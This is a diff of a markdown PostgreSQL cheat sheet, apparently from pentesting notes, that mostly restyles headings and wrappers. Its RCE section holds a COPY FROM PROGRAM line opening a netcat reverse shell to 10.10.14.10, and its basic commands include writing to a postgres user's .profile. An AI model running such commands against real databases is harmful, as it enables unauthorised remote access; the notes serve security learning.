@@ -5,9 +5,9 @@ tags: ["postgresql", "database"]
 ---
 
 ---
-### General
+### Connect
 
-#### Connect to postgresql Database
+<div>
 
 ```bash
 psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
@@ -17,7 +17,11 @@ psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME>
 psql postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>
 ```
 
-#### Basic Commands
+</div>
+
+### Basic
+
+<div>
 
 ```bash
 # Show databases
@@ -54,11 +58,21 @@ copy (select 'test') to '/var/lib/postgresql/.profile';
 \q
 ```
 
+</div>
+
+<br>
+
+---
+
 ### RCE
+
+<div>
 
 ```bash
 # Only superuser
 CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.10.14.10 1337 &'
 ```
+
+</div>
 
 <br>
